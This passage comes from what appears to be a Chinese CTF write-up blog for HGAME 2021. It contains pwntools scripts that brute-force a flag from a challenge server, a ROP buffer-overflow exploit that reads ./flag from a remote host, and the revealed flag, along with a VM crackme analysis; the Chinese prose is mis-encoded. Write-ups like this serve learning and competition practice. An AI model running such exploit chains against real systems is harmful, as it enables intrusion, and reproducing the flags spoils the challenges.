    io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    target <span class="token operator">=</span> <span class="token string">"ebx: (\d&#123;1,4&#125;)"</span>
    <span class="token comment">#string = "hgame&#123;You_K"</span>
    string <span class="token operator">=</span> <span class="token string">""</span>
    append <span class="token operator">=</span> <span class="token string">""</span>

    times <span class="token operator">=</span> <span class="token number">2</span>
    text <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        burp<span class="token punctuation">(</span>string <span class="token operator">+</span> append <span class="token operator">+</span> <span class="token string">"**************"</span><span class="token punctuation">,</span>times<span class="token punctuation">)</span>
        ebx_list <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">.</span>findall<span class="token punctuation">(</span>text<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>ebx_list<span class="token punctuation">)</span>
        <span class="token keyword">if</span> ebx_list<span class="token punctuation">:</span>
            append <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>ebx_list<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token builtin">int</span><span class="token punctuation">(</span>ebx_list<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>string <span class="token operator">+</span> append<span class="token punctuation">)</span>
        times <span class="token operator">+=</span> <span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>ä¸€å¼€å§‹æˆ‘è¯•ç€çˆ†ç ´ï¼Œä½†æ˜¯çˆ†ç ´äº†å‡ ä½åå°±å®¹æ˜“æŒ‚ï¼Œä¹Ÿä¸æ¸…æ¥šä¸ºä»€ä¹ˆï¼Œè¿™é‡Œæˆ‘ä¹Ÿç•™ä¸ªè„šæœ¬ï¼Œä¸‡ä¸€ä»€ä¹ˆæ—¶å€™å°±ç”¨ä¸Šäº†{doge}</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> re
<span class="token keyword">import</span> string
<span class="token keyword">import</span> time
<span class="token keyword">def</span> <span class="token function">burp</span><span class="token punctuation">(</span>string<span class="token punctuation">,</span>times<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> text
    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"101.132.177.131"</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>string<span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">" \n"</span><span class="token operator">*</span>times<span class="token punctuation">)</span>
    text <span class="token operator">=</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    target <span class="token operator">=</span> <span class="token string">"eax: \d&#123;1,4&#125;\nebx: \d&#123;1,4&#125;\necx: (\d&#123;1,3&#125;)\nzf: 1\n--------------INFO--------------\nWrong Flag! Try again!\n"</span>
    key <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> <span class="token string">'~!@#$%^&amp;*()_+-=;&lt;>?\\|\"\''</span>
    string <span class="token operator">=</span> <span class="token string">"hgame&#123;Yo"</span>
    append <span class="token operator">=</span> <span class="token string">""</span>

    i <span class="token operator">=</span> <span class="token number">0</span>
    times <span class="token operator">=</span> <span class="token number">20</span> 
    length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>
    text <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span>i <span class="token operator">&lt;</span> length<span class="token punctuation">)</span><span class="token punctuation">:</span>
        burp<span class="token punctuation">(</span>string<span class="token operator">+</span>append<span class="token operator">+</span>key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"aaaaaa"</span><span class="token punctuation">,</span>times<span class="token punctuation">)</span>
        ecx_list <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">.</span>findall<span class="token punctuation">(</span>text<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>ecx_list<span class="token punctuation">,</span>key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>string<span class="token operator">+</span>append<span class="token punctuation">,</span><span class="token string">"*"</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token string">"*"</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> ecx_list<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n***"</span><span class="token punctuation">,</span>key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"***"</span><span class="token punctuation">)</span>
            append <span class="token operator">+=</span> key<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
            times <span class="token operator">+=</span> <span class="token number">2</span>
            i <span class="token operator">=</span> <span class="token number">0</span>
            <span class="token keyword">continue</span>
        i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><h4 id="rop-primary"><a href="#rop-primary" class="headerlink" title="rop_primary"></a>rop_primary</h4><p>å…ˆæ˜¯ä¸€ä¸ªçŸ©é˜µä¹˜æ³•ï¼Œå†æ˜¯ä¸€ä¸ªreadæº¢å‡ºï¼Œåœ¨readä¸Šæäº‹æƒ…ã€‚</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#! usr/bin/python3</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> numpy
<span class="token keyword">import</span> re

io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"159.75.104.107"</span><span class="token punctuation">,</span><span class="token number">30372</span><span class="token punctuation">)</span>

data <span class="token operator">=</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"a * b = ?\n"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>
matrix_A_data <span class="token operator">=</span> data<span class="token punctuation">[</span>data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"A:"</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">:</span>data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"B:"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
matrix_B_data <span class="token operator">=</span> data<span class="token punctuation">[</span>data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"B:"</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">:</span>data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"a * b = ?\n"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
matrix_A <span class="token operator">=</span> numpy<span class="token punctuation">.</span>matrix<span class="token punctuation">(</span>matrix_A_data<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\t\n'</span><span class="token punctuation">,</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\t'</span><span class="token punctuation">,</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
matrix_B <span class="token operator">=</span> numpy<span class="token punctuation">.</span>matrix<span class="token punctuation">(</span>matrix_B_data<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\t\n'</span><span class="token punctuation">,</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\t'</span><span class="token punctuation">,</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
matrix_C <span class="token operator">=</span> numpy<span class="token punctuation">.</span>matmul<span class="token punctuation">(</span>matrix_A<span class="token punctuation">,</span>matrix_B<span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>numpy<span class="token punctuation">.</span>size<span class="token punctuation">(</span>matrix_C<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>numpy<span class="token punctuation">.</span>size<span class="token punctuation">(</span>matrix_C<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>matrix_C<span class="token punctuation">[</span>i<span class="token punctuation">,</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment">#0x0000000000401613 : pop rdi ; ret</span>
<span class="token comment">#0x0000000000401611 : pop rsi ; pop r15 ; ret</span>
<span class="token comment">#0x00000000004011ad : pop rbp ; ret</span>
rsi_ch <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x401611</span><span class="token punctuation">)</span>
rdi_ch <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x401613</span><span class="token punctuation">)</span>
rbp_ch <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x4011ad</span><span class="token punctuation">)</span>
read   <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x401080</span><span class="token punctuation">)</span>
open_  <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x4010A0</span><span class="token punctuation">)</span>
puts   <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x401040</span><span class="token punctuation">)</span>
test   <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x401583</span><span class="token punctuation">)</span>

payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">56</span><span class="token operator">*</span><span class="token string">'A'</span><span class="token punctuation">,</span>rsi_ch<span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0x404500</span><span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>read<span class="token punctuation">,</span>rsi_ch<span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>rdi_ch<span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0x404500</span><span class="token punctuation">)</span><span class="token punctuation">,</span>open_<span class="token punctuation">,</span>rsi_ch<span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0x404500</span><span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>rdi_ch<span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0x3</span><span class="token punctuation">)</span><span class="token punctuation">,</span>read<span class="token punctuation">,</span>rdi_ch<span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0x404500</span><span class="token punctuation">)</span><span class="token punctuation">,</span>puts<span class="token punctuation">,</span><span class="token number">0x30</span><span class="token operator">*</span><span class="token string">'\x00'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"./flag\x00\x00"</span><span class="token punctuation">)</span>                                                                               

<span class="token comment">#hgame&#123;10578e800f8a0e1695ca5f6970e0228fec1e15b06a7622360dffa1f4aa09cdd6&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>ç”±äºåŸºæœ¬è§ä¸åˆ° <em>mov edi,eax</em> <em>push eax</em>,æ‰€ä»¥æ‰¾ä¸åˆ°ç®€å•çš„æ–¹æ³•å»æŠŠraxçš„å€¼èµ‹ç»™rsiï¼Œåæ¥ç»è¿‡<strong>è¯­ç¥</strong>çš„æŒ‡å¯¼ï¼Œä»–è¯´ä¸ç”¨å»æ‰¾mov rdiï¼Œraxè¿™ç§ä¸œè¥¿ï¼Œæˆ‘å½“åœºè’™è”½ï¼Œäºæ˜¯ä¹å»å¯»æ‰¾open()æœ‰å…³çš„æ–‡æ¡£ï¼ŒåŠ ä¸Šè‡ªå·±è°ƒè¯•ï¼Œå‘ç°openï¼ˆï¼‰è¿”å›çš„eaxå±…ç„¶æ˜¯0x3ã€‚æŸ¥äº†ä¸€ä¸‹å‘ç°åŸæ¥ï¼Œæ¯æ¬¡open()è¿”å›çš„åº”è¯¥æ˜¯ä¸€ä¸ªæœ€å°çš„å€¼ï¼Œ0,1,2è¿™ä¸‰ä¸ªå¥æŸ„å¯¹åº”çš„æ˜¯æ ‡å‡†è¾“å…¥ï¼Œæ ‡å‡†è¾“å‡ºï¼Œæ ‡å‡†é”™è¯¯ï¼Œå¦‚æœæˆ‘ä»¬æŠŠå…¶ä¸­æŸä¸ªå…³æ‰ï¼Œé‚£ä¹ˆä¼šè¿”å›æœ€å°çš„é‚£ä¸ªã€‚ä½†æ˜¯æ”¹äº†ä¹‹åå‘ç°ï¼Œæ€ä¹ˆè¾“å…¥æ²¡æœ‰äº†ã€‚è°ƒè¯•ä¹‹åæ‰å‘ç°open()å‡½æ•°æ‰§è¡Œæ—¶æœ‰ç±»ä¼¼ mov rdx,rsiè¿™ç§æŒ‡ä»¤ï¼Œè€Œæˆ‘åªè¦æ»¡è¶³ä»–æ˜¯å¶æ•°(å¯è¯»)å°±å¯ä»¥äº†ï¼Œç”±æ­¤æˆ‘å‘ç°ä»¥åå¯ä»¥åˆ©ç”¨ä¸€äº›å‡½æ•°çš„å†…éƒ¨çš„æ“ä½œè¿›è¡ŒROPç­‰ç­‰ï¼Œä¸è¿‡å¾—å¾ˆç†Ÿæ‚‰ã€‚</p>
<p>å †é¢˜æŠŠæˆ‘æ‰“è£‚å¼€ï¼Œä¸æ‡‚åˆ©ç”¨ï¼Œæ¥ä¸åŠçœ‹äº†éƒ½æ€ªè¿™ä¸ªæµ·ç¯èŠ‚(</p>
<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="WhitegiveRSA"><a href="#WhitegiveRSA" class="headerlink" title="WhitegiveRSA"></a>WhitegiveRSA</h4><p>æ€è·¯ä¼°è®¡ä¸¤ç§ï¼Œä¸€ç§æ—¶ä»¥ä¸€äº›ç®—æ³•å»æ”»å‡»ï¼Œå¦å¤–ä¸€ç§å°±æ˜¯æŸ¥è¯¢æœ‰æ— ä½¿ç”¨ä»¥çŸ¥çš„å¯åˆ†è§£çš„å¤§ç´ æ•°</p>
<p>æ‰¾åˆ°å¯ç”¨çš„è„šæœ¬</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/rsa11.jpg" alt="1"></p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/rsa12.jpg" alt="1"></p>
]]></content>
      <categories>
        <category>HGAME</category>
      </categories>
      <tags>
        <tag>WP</tag>
        <tag>HGAME</tag>
      </tags>
  </entry>
  <entry>
    <title>HGAME_WEEK4_WP</title>
    <url>/2021/03/14/HGAME_WEEK4_WP/</url>
    <content><![CDATA[<h2 id="WEEK4-RogerThat-WP"><a href="#WEEK4-RogerThat-WP" class="headerlink" title="WEEK4-RogerThat WP"></a>WEEK4-RogerThat WP</h2><p>è¿™å‘¨æœ‰ç‚¹å¯’ç¢œï¼Œåªæœ‰ä¸‰é“é¢˜</p>
<h3 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h3><h4 id="vm"><a href="#vm" class="headerlink" title="vm"></a>vm</h4><p>è¿™é“é¢˜æ˜¯ä¸€é“è™šæ‹Ÿæœºç›¸å…³çš„é¢˜ç›®ï¼Œå› æ­¤åˆ†è®¸éœ€è¦èŠ±ä¸å°‘æ—¶é—´ï¼Œåœ¨æ²¡åšå‡ºæ¥ä¹‹å‰ä¹Ÿæ…¢æ…¢è¯•ç€å†™ç‚¹ä¸œè¥¿ï¼Œå¸Œæœ›ä¹Ÿèƒ½æœ‰æ‰€æ”¶è·ã€‚</p>
<p>é¦–å…ˆå¯»æ‰¾åˆ°mainå‡½æ•°</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  FILE <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// eax</span>
  <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>v5<span class="token punctuation">;</span> <span class="token comment">// rcx</span>
  <span class="token keyword">char</span> Buffer<span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-38h] BYREF</span>

  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Welcome to ovm++!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">j_inilization</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Input your flag: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v3 <span class="token operator">=</span> <span class="token function">_acrt_iob_func</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fgets</span><span class="token punctuation">(</span>Buffer<span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">j_printf_</span><span class="token punctuation">(</span><span class="token string">"Your flag is: %s\n"</span><span class="token punctuation">,</span> Buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"VM started successfully!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">j_vm_function</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>qword_7FF7ADCEE378<span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>Buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v4 <span class="token operator">=</span> <span class="token function">memcmp</span><span class="token punctuation">(</span>Buffer<span class="token punctuation">,</span> <span class="token operator">&amp;</span>unk_7FF7ADCEBD68<span class="token punctuation">,</span> <span class="token number">0x22u</span>i64<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v5 <span class="token operator">=</span> <span class="token string">"nop"</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v4 <span class="token punctuation">)</span>
    v5 <span class="token operator">=</span> <span class="token string">"good"</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/breakpoints.jpg" alt="breakpoints"></p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">#dialog
mov 83 to 000000B1524FF781
mov 46 to 000000B1524FF780
mov 23 to 000000B1524FF77F
mov 1 to 000000B1524FF77E
mov EC to 000000B1524FF77D
#.....
mov 90 to 000000B1524FF764
mov 75 to 000000B1524FF763
mov 5A to 000000B1524FF762
mov 39 to 000000B1524FF761
mov E9 to 000000B1524FF760
#ä¸€æ¬¡å¾ªç¯åŠ å¯†
mov 9 to 000000B1524FF781
mov 2C to 000000B1524FF780
mov 69 to 000000B1524FF77F
mov A7 to 000000B1524FF77E
mov F2 to 000000B1524FF77D
#...
mov 3B to 000000B1524FF763
mov 80 to 000000B1524FF762
mov BF to 000000B1524FF761
mov CF to 000000B1524FF760
#ç¬¬äºŒæ¬¡åŠ å¯†<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>å¤§è‡´å¯ä»¥å¾—å‡ºæ˜¯åŠ å¯†äº†ä¸¤éï¼ŒæŠŠæŸä¸€ä¸ªå€¼è®¡ç®—å¾—åˆ°åç§»åˆ°å¯¹åº”ä½ç½®ï¼Œè¿™ä¸ªä½ç½®ä»æœ€åä¸€ä½åˆ°ç¬¬ä¸€ä½å†ä»æœ€åä¸€ä½åˆ°ç¬¬ä¸€ä½ï¼Œä¸¤æ¬¡åŠ å¯†ï¼Œå¾—åˆ°ç»“æœ</p>
<p>å†è¿›ä¸€æ­¥çœ‹çœ‹æ¯ä¸ªä½ç½®çš„ç»“æœæ˜¯ç»“æœä»€ä¹ˆå¾—åˆ°çš„</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">#ç¬¬ä¸€æ¬¡å¾ªç¯ä¸‹
rdx:A
rdx:8
rdx:C
rdx:B
rdx:D
rdx:12
rdx:14
rdx:D
rdx:2&#x2F;&#x2F;different
rdx:13
rdx:7
rdx:15
rdx:C
rdx:11&#x2F;different
rdx:9
rdx:16
#ç¬¬äºŒæ¬¡å¾ªç¯ä¸‹
rdx:A
rdx:8
rdx:C
rdx:B
rdx:D
rdx:12
rdx:14
rdx:D
rdx:6 &#x2F;&#x2F;different
rdx:13
rdx:7
rdx:15
rdx:C
rdx:4 &#x2F;&#x2F;different
rdx:9
rdx:16<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<pre class="line-numbers language-none"><code class="language-none">A:PUSH_BX
8:PUSH
C:POP_AX
B:PUSH_DX
D:POP_BX
12:CMP
14:JZ
D:POP_BX<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>ç”±æ­¤å¯è§A,8,C,B,D,12,14,D,2,13,7,15,C,11,9,16;è¿™äº› OPCODE ç»„æˆäº†ä¸€ä¸ªåŠ å¯†çš„å¾ªç¯ï¼Œè€Œç¬¬ä¸€ä¸ªå˜›æˆ‘ä¹Ÿä¸æ¸…æ¥šï¼Œæ€»ä¹‹å®ƒçš„ç»“æœæ˜¯â€™{â€˜â€”&gt;?åº”è¯¥ä¹Ÿä¸ç”¨å¤ªåœ¨æ„</p>
<p>é€šè¿‡å¯¹æ¯”ä¸¤æ¬¡è¾“å…¥çš„rdxæµï¼Œå‘ç°è¿™ä¸ªå…³äºæ¯ä¸ªå­—ç¬¦æ˜¯ç‹¬ç«‹åŠ å¯†çš„ï¼Œä¹Ÿå°±æ˜¯ç¼ºå°‘â€œæ‰©æ•£â€çš„ä¸€ç§åŠ å¯†æ–¹æ³•ï¼Œè™½ç„¶è¿™æ ·æˆ‘æ›´å¥½åšé¢˜ç›®äº†ï¼Œhhha</p>
<p>æ•´ç†åŠ å¯†çš„ä¼ªä»£ç ä¹‹åå¾—åˆ°å¦‚ä¸‹ç»“æœ</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">struct VM&#123;
        uint64_t *alloc_mem_pt;
        uint64_t *buffer_pt;
        uint8_t a;
        uint8_t x1;
        uint8_t x2;
        uint8_t x3;
        uint8_t x4;
        uint8_t b;
&#125;vm;

&#x2F;&#x2F;A:
    vm.x3 &#x3D; v8 + 1;
    *(_BYTE *)(vm.x3 + pt_of_memory) &#x3D; vm.x1;
    goto LABEL_32;
&#x2F;&#x2F;8:
    function();
    vm.x3 &#x3D; v8 + 1;
    *(_BYTE *)(vm.x3 + pt_of_memory) &#x3D; v2;

&#x2F;&#x2F;ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚
&#x2F;&#x2F;ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚
&#x2F;&#x2F;æˆ‘çš„æ„šæ˜§çš„ä¼ªä»£ç ï¼Œç•™åœ¨è¿™è­¦ç¤ºä¸€ä¸‹æˆ‘è‡ªå·± &#x2F;åè¡€.jpg
    result &#x3D; *a1;
    v7 &#x3D; *a1 + 8 * v18;
    if ( !*(_BYTE *)(v7 + 4) )
        continue;

void function()&#123;
    v11 &#x3D; v5++;
    vm.x4 &#x3D; v5;
    v2 &#x3D; *(_BYTE *)(*a1 + 8 * v11);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>æ¥ä¸‹æ¥æ€è·¯å°±ç®€å•äº†ï¼Œè¦ä¹ˆé™æ€åˆ†æï¼Œè¦ä¹ˆåŠ¨æ€è°ƒè¯•ä¸€æ³¢ï¼Œæ€»ä¹‹ä¸ºäº†ç†è§£è¿™ä¸ªç¨‹åºæµä¸æ‹©æ‰‹æ®µ2333<br>å…¶å®ä¹Ÿå¯ä»¥åˆ†ææ±‡ç¼–ï¼Œä¸è¿‡ä¼°è®¡ä¼ªä»£ç åº”è¯¥æ¯”æ±‡ç¼–ç®€å•ä¸€äº›</p>
<p>å¤§æ„äº†ï¼Œçœ‹å‡ºç¬¬ä¸€ä¸ªå¾ªç¯æ˜¯ä»åå¾€å‰å¼‚æˆ–ï¼Œæ²¡æƒ³åˆ°ç¬¬äºŒä¸ªå¾ªç¯å˜äº†.</p>
